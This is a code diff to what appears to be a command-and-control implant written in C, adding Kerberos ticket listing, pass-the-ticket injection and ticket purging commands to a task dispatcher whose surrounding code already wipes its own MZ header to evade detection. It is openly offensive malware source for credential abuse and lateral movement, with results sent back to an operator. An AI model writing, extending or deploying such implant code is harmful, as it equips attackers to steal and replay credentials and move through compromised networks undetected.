@@ -1,4 +1,5 @@
 #include "commands.h"
+#include "kerberos.h"
 #include "transport.h"
 #include "config.h"
 #include "evasion.h"
@@ -673,6 +674,25 @@ void dispatch_task(AgentTask *task) {
             VirtualProtect((LPVOID)base, 2, old, &old);
             agent_send_result(task->id, "[+] MZ header wiped", "");
         }
+    }
+    else if (strcmp(type_upper, "KERB_LIST") == 0) {
+        char *out = kerb_list_tickets();
+        agent_send_result(task->id, out, "");
+        free(out);
+    }
+    else if (strcmp(type_upper, "KERB_PTT") == 0) {
+        if (!args || !args[0]) {
+            agent_send_result(task->id, "", "KERB_PTT: base64-encoded kirbi ticket required");
+            return;
+        }
+        char *out = kerb_pass_ticket(args);
+        agent_send_result(task->id, out, "");
+        free(out);
+    }
+    else if (strcmp(type_upper, "KERB_PURGE") == 0) {
+        char *out = kerb_purge();
+        agent_send_result(task->id, out, "");
+        free(out);
     }
     else {
         char err[128];
